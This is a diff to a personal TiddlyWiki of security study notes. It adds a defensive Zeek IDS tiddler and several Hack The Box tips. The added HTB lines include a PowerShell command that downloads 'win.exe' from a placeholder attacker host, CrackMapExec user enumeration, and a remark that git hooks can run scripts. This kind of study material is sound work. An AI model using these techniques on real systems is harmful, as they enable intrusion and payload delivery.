@@ -173,6 +173,8 @@ Error message and password prompt
 
 <li>$:/temp/info-plugin</li>
 
+<li>$:/temp/search</li>
+
 <li>$:/themes/tiddlywiki/snowwhite</li>
 
 <li>$:/themes/tiddlywiki/vanilla</li>
@@ -372,6 +374,8 @@ Error message and password prompt
 <li>Windows Internals Notes</li>
 
 <li>Yara</li>
+
+<li>Zeek</li>
 
 </ul>
 </p>
@@ -9773,7 +9777,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20191111140332771" modified="20191111140332771" title="$:/state/tab/sidebar--595412856">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div created="20191111140437947" list="About" modified="20191111140455411" title="$:/StoryList">
+<div created="20191128202335856" list="[[HTB Notes]]" modified="20191128202335856" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9833,6 +9837,9 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
         }
     }
 }</pre>
+</div>
+<div created="20191117014049636" modified="20191117014050535" title="$:/temp/search">
+<pre></pre>
 </div>
 <div author="JeremyRuston" core-version="&gt;=5.0.0" dependents="$:/themes/tiddlywiki/vanilla" description="Emphasises individual tiddlers" name="Snow White" plugin-priority="0" plugin-type="theme" title="$:/themes/tiddlywiki/snowwhite" type="application/json" version="5.1.21">
 <pre>{
@@ -12071,7 +12078,7 @@ for i in range(8,33): #count from 8 to 32, since signkey length is randomly from
 
 ```</pre>
 </div>
-<div created="20181228151627892" modified="20190428175934076" title="HTB Notes">
+<div created="20181228151627892" modified="20191129011501313" title="HTB Notes">
 <pre>Hackthebox notes/things learned
 
 privesc:
@@ -12169,7 +12176,13 @@ getting code exec with variable:
 ```
 var = $(ls -l)
 echo $var
-```</pre>
+```
+
+CrackMapExec - discover users --rid-brute
+
+powershell remote file download: invoke-webrequest -uri http://IP/win.exe -outfile win.exe
+
+git pull or other git commands can execute scripts through .git/hooks/. chmod +x the script in hooks folder. </pre>
 </div>
 <div created="20190306174048371" modified="20190307173155688" title="Hunting for fileless malware">
 <pre>Link: https://www.pluralsight.com/courses/detecting-analyzing-fileless-malware
@@ -14460,7 +14473,7 @@ Email signature can be useful for IDing software or hardware.
 paid sites: linkedin premium, background report, lexisnexis, transunion TLOxp, IRBsearch
 </pre>
 </div>
-<div created="20180806183636309" modified="20190720233634025" title="PluralSight Notes">
+<div created="20180806183636309" modified="20191124165724564" title="PluralSight Notes">
 <pre>Notes from viewing PluralSight courses. Got cheap PluralSight membership because of the university. :-D
 
 [[Windows Internals Notes]]
@@ -14515,7 +14528,10 @@ paid sites: linkedin premium, background report, lexisnexis, transunion TLOxp, I
 
 [[Post exploitation]]
 
-[[Malware Analysis: obfuscation]]</pre>
+[[Malware Analysis: obfuscation]]
+
+[[Zeek]]
+</pre>
 </div>
 <div created="20190704163426915" modified="20190704193353198" title="Post exploitation">
 <pre>https://app.pluralsight.com/library/courses/post-exploitation-pillaging-data-exfiltration/table-of-contents
@@ -15372,6 +15388,35 @@ https://github.com/godaddy/procfilter &quot;ProcFilter is a process filtering sy
 Volatily uses yarascan for scanning memory with yara rules. `yarascan -y rule.yar`
 
 Zeek/broIDS and file carving can be used with yara scanning.</pre>
+</div>
+<div created="20191117015626128" modified="20191117023946326" title="Zeek">
+<pre>Bro / BroIDS
+
+Output: ascii, json, sqlite
+
+ZeekControl - for managing standalone or cluster setup. command: `zeekctl`
+
+node.cfg - interface and cluster configuration
+
+Zeek logs are in Zeek directory, not in /var/log.
+
+Zeek supports geolite2 database. 
+
+Input into zeek: tables or data streams
+
+Logging: ascii, sqlite, JSON
+
+Netcontrol Framework - allows actions based on events
+
+Zeek Package manger - uses git repo to get packages.
+
+Zeek Broker - logging and alerting, sub/pub, and etc...
+
+Signature conditionions: Header condition (src/dst, ip, proto). Content condition (match in content using regex). Dependency condition (use multiple signatures).
+
+Signature actions: Event (log, email, etc) and Enable (start analyzer or script)
+
+`zeek -r pcapfile -s signature` Signature detection output is in signature.log</pre>
 </div>
 
 </div>
